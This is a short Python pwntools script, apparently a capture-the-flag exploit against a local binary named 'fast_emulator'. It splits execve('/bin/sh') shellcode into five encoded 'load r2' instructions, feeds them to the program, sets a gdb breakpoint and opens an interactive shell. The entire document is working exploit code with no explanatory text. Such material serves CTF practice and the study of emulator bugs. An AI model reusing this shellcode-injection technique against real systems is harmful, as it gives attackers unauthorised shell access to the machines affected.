from pwn import *
context.log_level="debug"
context.arch="amd64"
sh=process("./fast_emulator")
sh.sendlineafter(b"Please enter the number of lines you want to enter: ", b'5')
def shellcode_encode(sc):
    return bytes(list(asm(sc))[::-1]).hex().encode()
shellcode1="mov rax, 0x732f2f2f6e69622f"
shellcode2="push 0x68\npush rax\nmov rdi, rsp\npush 0x1010101 ^ 0x6873"
shellcode3="xor dword ptr [rsp], 0x1010101\nxor esi, esi\npush rsi\npush 8"
shellcode4="pop rsi\nadd rsi, rsp\npush rsi\nmov rsi, rsp\nxor edx, edx"
shellcode5="push 59\npop rax\nsyscall"

payload=[0]*5
payload[0]=b"load r2, "+b"0x"+shellcode_encode(shellcode1)+b"deadbeef"
payload[1]=b"load r2, "+b"0x"+shellcode_encode(shellcode2)+b"deadbeef"
payload[2]=b"load r2, "+b"0x"+shellcode_encode(shellcode3)+b"deadbeef"
payload[3]=b"load r2, "+b"0x"+shellcode_encode(shellcode4)+b"deadbeef"
payload[4]=b"load r2, "+b"0x"+shellcode_encode(shellcode5)+b"deadbeef"

gdb.attach(sh,"b *$rebase(0x1A1D)\nc")
for i in payload:
    sh.sendlineafter(b"> ",i)
sh.interactive()